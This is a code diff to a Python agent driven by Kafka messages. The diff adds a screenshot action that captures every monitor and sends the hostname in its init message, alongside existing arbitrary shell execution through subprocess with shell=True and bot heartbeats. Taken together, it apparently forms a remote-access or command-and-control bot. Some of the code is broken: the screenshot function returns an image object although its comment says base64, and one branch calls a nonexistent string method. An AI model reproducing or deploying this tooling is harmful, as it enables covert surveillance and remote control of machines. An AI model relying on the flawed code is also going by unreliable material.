@@ -5,6 +5,8 @@ from kafka_consumer import KafkaConsumerDaemon
 import subprocess
 import uuid
 import schedule
+from mss import mss
+from PIL import Image
 
 def handle_callback(task, group_id):
     """ Handle the callback logic based on the consumed message. """
@@ -19,12 +21,19 @@ def handle_callback(task, group_id):
                 # For exec_script, use subprocess.run
                 result = subprocess.run(script_value, shell=True, check=True, text=True, capture_output=True)
                 print(f'Script output: {result.stdout}')
+                result_str = result.stdout
+            elif task['actionType'] == 'screenshot':
+                # For creates an screenshot, use the system command and sends in base64 format
+                result_str = shot_screenshot()
+                print(f'Screenshot output: {result_str}')
             else:
                 result = script_value.system(script_value)
                 print(f'Script output: {result.stdout}')
+                result_str = result.stdout
         except subprocess.CalledProcessError as e:
             print(f'Script execution failed: {e.stderr}')
             result = e.stderr
+            
         # Produce a callback message
         callback_task = {
             'actionType': 'callback',
@@ -32,9 +41,24 @@ def handle_callback(task, group_id):
                 'groupId': group_id,
                 'taskId': task['id']
             },
-            'result': result.stdout
+            'result': result_str
         }
         produce_message(bootstrap_servers, 'callback', callback_task)
+
+def shot_screenshot():
+    """ Take a screenshot and return the image in base64 format. """
+    try:
+        with mss() as sct:
+            # Capture the screenshot
+            sct_img = sct.grab(sct.monitors[0])  # monitors[0] represents all monitors combined
+            
+            # Convert to PIL Image
+            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
+
+            return img
+    except Exception as e:
+        print(f"Error taking screenshot: {e}")
+        return str(e)
 
 """ Produce a heartbeat message to the specified topic. """
 def produce_heart_beat(bootstrap_servers, topic, bot_id):
@@ -62,7 +86,8 @@ def main(bootstrap_servers, topic):
         'actionType': 'init',
         'parameters': {
             'groupId': group_id,
-            'os': platform.platform()
+            'os': platform.platform(),
+            'name': platform.node()
         },
         'result': "success"
     }
